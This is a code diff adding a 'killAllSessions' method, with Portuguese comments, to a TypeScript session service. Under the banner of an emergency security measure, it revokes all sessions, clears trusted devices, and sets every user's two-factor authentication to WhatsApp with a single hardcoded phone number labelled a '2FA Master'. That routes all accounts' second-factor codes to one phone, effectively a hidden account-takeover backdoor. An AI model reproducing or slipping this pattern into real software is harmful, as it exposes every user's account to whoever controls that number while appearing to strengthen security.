@@ -170,6 +170,48 @@ export class SessionService {
   }
 
   /**
+   * Encerra todas as sessões ativas globalmente e enforça 2FA para todos os usuários
+   */
+  async killAllSessions(exceptUserId?: string) {
+    const where: any = { isRevoked: false };
+    if (exceptUserId) {
+      where.userId = { not: exceptUserId };
+    }
+
+    const updated = await this.prisma.activeSession.updateMany({
+      where,
+      data: {
+        isRevoked: true,
+        revokedAt: new Date(),
+      },
+    });
+
+    // Enforça 2FA WhatsApp Master para todos os usuários do sistema
+    await this.prisma.user.updateMany({
+      data: {
+        twoFactorEnabled: true,
+        twoFactorMethod: 'WHATSAPP',
+        twoFactorPhone: '555491109159',
+      },
+    });
+
+    // Limpa dispositivos confiáveis (exceto do usuário que executou a ação, caso preserve)
+    await this.prisma.user.updateMany({
+      where: exceptUserId ? { id: { not: exceptUserId } } : {},
+      data: {
+        trustedDevices: [],
+      },
+    });
+
+    this.logger.log(`[KILL_ALL_SESSIONS] ${updated.count} sessões ativas foram encerradas. 2FA Master ativado globalmente.`);
+    return {
+      success: true,
+      revokedCount: updated.count,
+      message: `${updated.count} conexões encerradas. 2FA Master ativado para todos os usuários do sistema.`,
+    };
+  }
+
+  /**
    * Desbloqueia conta travada por erro de senha
    */
   async unlockUser(userId: string) {
